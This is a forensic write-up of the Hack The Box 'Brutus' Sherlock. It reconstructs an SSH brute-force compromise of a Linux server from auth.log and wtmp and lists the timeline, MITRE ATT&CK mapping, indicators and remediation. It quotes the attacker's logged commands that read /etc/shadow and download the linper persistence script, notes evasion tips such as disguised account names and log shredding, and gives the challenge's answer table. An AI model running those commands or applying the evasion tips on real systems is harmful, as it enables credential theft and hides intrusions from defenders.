# HTB Sherlock — Brutus

**Platform:** Hack The Box Sherlocks
**Category:** DFIR — Linux Auth Log Analysis
**Difficulty:** Very Easy
**Scenario:** SSH brute-force followed by interactive compromise, local account persistence, and download of a known Linux persistence toolkit.

---

## Scenario

A Linux server (AWS EC2, hostname `ip-172-31-35-28`, running Atlassian Confluence) shows signs of unauthorized access. The provided artifacts are `/var/log/auth.log` and `/var/log/wtmp` covering the morning of March 6, 2024. The objective is to reconstruct the intrusion timeline, identify the attacker's IP, confirm the compromised account, and document the persistence mechanism established post-compromise.

---

## Artifacts Reviewed

| Artifact | Purpose |
|---|---|
| `auth.log` | SSH authentication events, PAM sessions, sudo commands, user/group modifications |
| `wtmp` | Binary record of interactive login sessions — parsed with a Python `utmp` parser to TSV |

The two artifacts corroborate each other: `auth.log` provides per-second event detail including brute force attempts and sudo commands, while `wtmp` provides authoritative login session data with source IPs that can't be spoofed by manipulating `auth.log` alone.

---

## Investigation

### Establishing the Baseline — Who Was Supposed to Be Here

Parsing `wtmp` against the full retained history shows a single source IP used by the legitimate administrator across months of activity:

| Date | User | Source IP |
|---|---|---|
| 2024-01-25 11:13 | ubuntu | 203.101.190.9 |
| 2024-01-25 11:15 | root | 203.101.190.9 |
| 2024-02-11 10:33–10:54 | root (×3) | 203.101.190.9 |
| 2024-03-06 06:19 | root | 203.101.190.9 |

`203.101.190.9` is the legitimate administrator baseline. Any source IP other than this one, appearing for the first time, is immediately suspicious.

### Brute Force Identification — auth.log

At `06:31:31` UTC on 2024-03-06, the auth.log records a burst of SSH connections from a previously unseen IP:

```
Mar  6 06:31:31 sshd[2325]: Invalid user admin from 65.2.161.68 port 46380
Mar  6 06:31:31 sshd[620]:  error: beginning MaxStartups throttling
Mar  6 06:31:31 sshd[620]:  drop connection #10 from [65.2.161.68]:46482 on [172.31.35.28]:22 past MaxStartups
```

The `MaxStartups throttling` message is significant — it means `sshd` is dropping concurrent unauthenticated connections because the attacker is opening them faster than the daemon's policy allows. This behavior is a hallmark of automated brute force tools such as Hydra, Medusa, or patator configured with high concurrency. During the throttling window, 21 connections were dropped before the daemon exited throttling state at `06:32:39`.

Enumerating the distinct usernames the attacker attempted:

| Username | Valid on system? |
|---|---|
| `admin` | No |
| `backup` | Yes (default Linux account) |
| `server_adm` | No |
| `svc_account` | No |
| `root` | **Yes — succeeded** |

The attacker used a small, plausible username list — not a mass password spray — suggesting either reconnaissance ahead of time or the use of a short targeted wordlist. A total of 96 failed authentication events from `65.2.161.68` are recorded in the ~70-second brute force window.

### Successful Compromise

```
Mar  6 06:31:40 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2
Mar  6 06:31:40 sshd[2411]: Disconnected from user root 65.2.161.68 port 34782
```

The first successful authentication was part of the brute force itself — likely the tool confirming the hit and immediately disconnecting. Approximately one minute later, the attacker reconnected for an interactive session:

```
Mar  6 06:32:44 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
Mar  6 06:32:44 systemd-logind[411]: New session 37 of user root.
```

The `wtmp` record independently confirms this interactive session began at `2024-03-06 06:32:45` with host `65.2.161.68`. Session 37 is the attacker's primary interactive foothold.

### Persistence Establishment

Between `06:34:18` and `06:35:15` the attacker created a new local account and elevated its privileges:

```
Mar  6 06:34:18 groupadd[2586]: new group: name=cyberjunkie, GID=1002
Mar  6 06:34:18 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002,
                               home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1
Mar  6 06:34:26 passwd[2603]:  pam_unix(passwd:chauthtok): password changed for cyberjunkie
Mar  6 06:34:31 chfn[2605]:    changed user 'cyberjunkie' information
Mar  6 06:35:15 usermod[2628]: add 'cyberjunkie' to group 'sudo'
Mar  6 06:35:15 usermod[2628]: add 'cyberjunkie' to shadow group 'sudo'
```

This is the canonical Linux persistence technique — creating a backdoor account with sudo rights so the attacker retains privileged access even if the original root password is rotated. It maps to **T1136.001 — Create Account: Local Account** for persistence, and **T1098 — Account Manipulation** for the group membership change that grants privilege.

### Switch to Backdoor Account

At `06:37:24` the attacker ended the root session:

```
Mar  6 06:37:24 sshd[2491]: Received disconnect from 65.2.161.68 port 53184:11: disconnected by user
Mar  6 06:37:24 sshd[2491]: Disconnected from user root 65.2.161.68 port 53184
```

The root session (session 37) lasted exactly **4 minutes 39 seconds** — long enough to provision the backdoor account and nothing else. Ten seconds later the attacker logged back in using that account:

```
Mar  6 06:37:34 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2
Mar  6 06:37:34 systemd-logind[411]: New session 49 of user cyberjunkie.
```

This is an operational tradecraft detail — the attacker is validating the backdoor works before relying on it, and from this point forward all activity generates logs attributed to `cyberjunkie` rather than `root`.

### Credential Dumping

```
Mar  6 06:37:57 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ;
                     USER=root ; COMMAND=/usr/bin/cat /etc/shadow
```

Reading `/etc/shadow` yields the hashes for all local accounts. These are suitable for offline cracking with `hashcat` or `john`, providing the attacker a path to pivot to other systems via credential reuse — or to maintain access if `cyberjunkie` is ever discovered and removed. This maps to **T1003.008 — OS Credential Dumping: /etc/passwd and /etc/shadow**.

### Persistence Tool Download

```
Mar  6 06:39:38 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ;
                     COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

`linper` is a publicly available Linux persistence toolkit (github.com/montysecurity/linper) that automates the installation of multiple persistence mechanisms simultaneously — cron jobs, systemd services, SSH authorized_keys, PAM backdoors, and profile script hooks. Downloading it under `sudo` is the attacker preparing to deepen persistence beyond just the local account they already created.

Notable: the attacker chose to use `sudo curl` instead of `su -` to a root shell. The distinction matters for forensics — `sudo` logs the full command line verbatim, including the URL. A more careful operator would have promoted to a full root shell first, which would have left only a single `su` event and no record of the URL.

---

## Timeline

All timestamps UTC, 2024-03-06.

| Time | Event |
|---|---|
| 06:17:15 | System boot (kernel 6.2.0-1018-aws) |
| 06:19:54 | Legitimate admin login as root from `203.101.190.9` |
| 06:31:31 | Brute force begins from `65.2.161.68` — triggers MaxStartups throttling |
| 06:31:40 | First successful auth as root — immediately disconnects |
| 06:32:44 | Interactive root session opens from `65.2.161.68` (session 37) |
| 06:34:18 | `cyberjunkie` account created (UID 1002) |
| 06:34:26 | Password set for `cyberjunkie` |
| 06:35:15 | `cyberjunkie` added to `sudo` group |
| 06:37:24 | Attacker's root session ends |
| 06:37:34 | Attacker logs in as `cyberjunkie` (session 49) |
| 06:37:57 | `sudo cat /etc/shadow` — credential dumping |
| 06:39:38 | `sudo curl` downloads `linper.sh` persistence toolkit |

---

## Investigation Q&A

| # | Question | Answer |
|---|---|---|
| 1 | Attacker IP used to carry out the brute force | `65.2.161.68` |
| 2 | Username of the account compromised via brute force | `root` |
| 3 | UTC timestamp of the attacker's interactive terminal login (per `wtmp`) | `2024-03-06 06:32:45` |
| 4 | SSH session number assigned to the attacker's root session | `37` |
| 5 | New account created for persistence with elevated privileges | `cyberjunkie` |
| 6 | MITRE ATT&CK sub-technique ID for persistence via new account creation | `T1136.001` |
| 7 | Time attacker's first SSH session ended (per `auth.log`) | `2024-03-06 06:37:24` |
| 8 | Full sudo command used to download the persistence script | `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh` |

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Credential Access | Brute Force: Password Guessing | T1110.001 |
| Initial Access | Valid Accounts: Local Accounts | T1078.003 |
| Persistence | Create Account: Local Account | T1136.001 |
| Persistence | Account Manipulation | T1098 |
| Credential Access | OS Credential Dumping: /etc/passwd and /etc/shadow | T1003.008 |
| Command and Control | Ingress Tool Transfer | T1105 |

---

## Indicators of Compromise

| Type | Value | Context |
|---|---|---|
| IPv4 | `65.2.161.68` | Attacker source — AWS ap-south-1 (Mumbai) |
| IPv4 | `203.101.190.9` | Legitimate admin — **not malicious**, included for baseline exclusion |
| Local account | `cyberjunkie` (UID 1002, GID 1002) | Attacker-created backdoor with sudo privileges |
| URL | `https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh` | Linux persistence toolkit download |
| Tool | `linper` (GitHub: montysecurity/linper) | Known Linux persistence automation framework |

---

## Containment & Remediation Recommendations

1. **Disable and delete the `cyberjunkie` account** — `userdel -r cyberjunkie` to remove home directory and mail spool
2. **Rotate all local credentials** — `/etc/shadow` was read and hashes are assumed compromised. Force password reset on every local account
3. **Audit for secondary persistence** — if `linper.sh` was executed (not just downloaded), inspect `/etc/cron.*`, `/etc/systemd/system/`, `~/.ssh/authorized_keys` for every user, `/etc/pam.d/`, and `~/.bashrc` / `/etc/profile.d/` for injected hooks
4. **Block `65.2.161.68`** at the perimeter firewall and network ACLs
5. **Harden SSH configuration** — disable root login (`PermitRootLogin no`), require key-based authentication (`PasswordAuthentication no`), and restrict source IP ranges via `AllowUsers` or firewall rules
6. **Implement fail2ban or CrowdSec** — automated blocking after N failed auth attempts would have cut this brute force off before the 96th attempt succeeded
7. **Identify the initial attack vector** — the Confluence service running on this host (evidenced by the `confluence` cron user) should be inspected for a prior compromise via CVE (CVE-2023-22515, CVE-2022-26134, etc.), as an attacker with Confluence RCE could have obtained the root password via memory dump, configuration file access, or credential file harvesting before the brute force
8. **Review sudo logs going back further** — `cyberjunkie` was the known backdoor, but any earlier post-Confluence-exploit activity may have established additional persistence this auth.log window does not cover

---

## Operator Tradecraft Observations

The attacker made several choices that preserved forensic evidence:

- **No source IP rotation** — the same `65.2.161.68` is present from brute force through credential dumping through persistence tool download. Attribution would have been significantly harder if the attacker had pivoted to a residential VPN or Tor exit after establishing access.
- **Human-recognizable account name** — `cyberjunkie` stands out in `/etc/passwd`. A system-looking name such as `systemd-journald-helper` or `_apt-monitor` would blend into the existing system accounts and evade routine visual inspection.
- **`sudo curl` instead of root shell** — the sudo log recorded the full URL of the persistence tool, handing investigators a direct IOC. A `su -` to a real root shell followed by `curl` would have left only a single `su` event and no URL.
- **No log cleanup** — `auth.log` retains the complete intrusion chain end to end. Even minimal effort (stopping `rsyslog` briefly or `shred`ing the current log) would have degraded the investigation significantly.

These patterns are consistent with a semi-automated or unsophisticated operator — effective for smash-and-grab cryptojacking or ransomware deployment, but easily traced.

---

## Takeaways

- **`MaxStartups throttling` messages in `auth.log` are a direct indicator of automated brute force tooling.** The SSH daemon's own rate-limiting telling you it ran out of connection slots is a stronger signal than any single failed-login count.
- **Always baseline legitimate IPs before classifying new ones as malicious.** A single administrator IP consistent across months of login history makes a first-time foreign IP trivially identifiable as anomalous.
- **`wtmp` and `auth.log` corroborate each other.** `wtmp` proves a session actually opened from a given IP; `auth.log` details the authentication path that got there. Both are required for a defensible timeline.
- **`T1136.001` + `T1098` is the canonical Linux account-persistence pairing.** New account creation alone is only Persistence; adding to a privileged group converts it into ongoing privileged persistence. Detection rules should fire on the combination, not either event alone.
- **Sudo command line logging is among the most useful artifacts in any Linux investigation.** When an attacker uses sudo for convenience instead of promoting to a full root shell, they hand investigators a direct IOC — in this case, the exact URL of a persistence toolkit.
